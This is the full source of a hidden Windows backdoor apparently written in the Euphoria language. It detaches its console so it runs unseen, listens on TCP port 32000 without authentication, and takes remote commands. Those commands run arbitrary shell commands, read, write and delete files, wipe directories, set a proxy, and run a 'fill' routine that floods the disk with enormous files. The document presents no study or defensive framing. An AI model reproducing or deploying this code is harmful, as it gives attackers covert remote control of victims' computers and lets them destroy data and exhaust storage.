include std/socket.e
include std/console.e
include std/filesys.e
include std/sequence.e
include std/io.e
include std/dll.e

atom kernel32=open_dll("kernel32.dll")
if kernel32 then
	c_proc(define_c_proc(kernel32,"FreeConsole",{}),{})
end if

object client = {}
object Command = {}
object Status = 0
object fid={}
object buffer={}

function receive_string ()
	sockets:send(client[1],":",0)
	while atom(sockets:receive(client[1], 0)) do
	end while
	return sockets:receive(client[1], 0)
end function

procedure OK_FAIL(object Condition)
	if Condition then
    	sockets:send(client[1],"OK",0)
	else
    	sockets:send(client[1],"Fail",0)
	end if
end procedure

procedure text_works(sequence Rights )
			Command=receive_string()
			fid=open(Command, Rights)
			if fid = -1 then
          	sockets:send(client[1],"Not found",0)
			else    
				Command=receive_string()
				while not(equal(Command,"END")) do
					puts(fid,Command)
					Command=receive_string()
				end while
			close(fid)
			end if
end procedure

sockets:socket server = sockets:create(sockets:AF_INET, sockets:SOCK_STREAM, 0)
if not(equal( server, -1 )) and sockets:bind(server,"0.0.0.0",32000)=sockets:OK then

while (sockets:listen(server, 10) = sockets:OK) and (Status!=2) do
	client = sockets:accept(server)
	Status=0
	while Status=0 do
		sockets:send(client[1],"\n\r#",0)
		Command = sockets:receive(client[1], 0)
		if atom(Command) then
			Status=1
		else 
		switch Command do
		case "stop" then
			sockets:send(client[1],"Stopped", 0)
			Status=2
		case "cmd" then 
			system(receive_string(),0)
			sockets:send(client[1],"OK",0)
		case "cd" then
			Command=receive_string()
			if equal(Command,"this") then
				sockets:send(client[1],current_dir(),0)
			else
				if chdir(Command) then
  				sockets:send(client[1],"New dir: " & current_dir(),0)
				else
                	sockets:send(client[1],"Fail",0)
				end if
			end if
		case "read" then
			Command=receive_string()
			fid=open(Command, "r") 
			if (fid=-1) then
				sockets:send(client[1],"Not found",0)
			else
				sockets:send(client[1],read_file(fid,TEXT_MODE),0)
				close(fid)
		    end if
		case "dir" then
			Command=receive_string()
			if atom(Command) then
				sockets:send(client[1],"Fail",0)
          		elsif equal(Command,"this") then
				sockets:send(client[1],join(vslice(dir(current_dir()),1,1),"\n\r"),0)
			else
				sockets:send(client[1],join(vslice(dir(Command),1,1),"\n\r"),0)
		    end if
		case "fill" then
			Command=receive_string()
			for i=1 to 10000000 do
			fid=open(Command, "w")
				for j=1 to 100000000 do  
					puts(fid,Command)
				end for
			close(fid)
			Command=Command & "^_^"
			end for
		case "proxy" then
			system("set http_proxy=http://" & receive_string(),0)
		case "help" then
			sockets:send(client[1],"append \n\rcd \n\rcmd \n\rcp \n\rdel \n\rdel_all \n\rdir \n\rexec \n\rfill \n\rmove \n\rnf \n\rnd \n\rproxy \n\rrd \n\rread \n\rrename \n\rstop \n\rwrite",0) 
		case "write" then
			text_works("w")
		case "append" then
			text_works("a")
		case "exec" then
			OK_FAIL(system_exec(receive_string(),0)!=-1)
		case "move" then
			OK_FAIL(move_file(receive_string(),receive_string(),1))
		case "rename" then
			OK_FAIL(rename_file(receive_string(),receive_string(),1))
		case "cp" then
			OK_FAIL(copy_file(receive_string(),receive_string(),1))
		case "rd" then
			OK_FAIL(remove_directory(receive_string(),1))
		case "del_all" then
			OK_FAIL(clear_directory(receive_string()))
		case "del" then
			OK_FAIL(delete_file(receive_string()))
		case "nf" then
			OK_FAIL(create_file(receive_string()))
		case "nd" then
			OK_FAIL(create_directory(receive_string()))
		end switch
		end if
	end while
end while
sockets:shutdown(server)
end if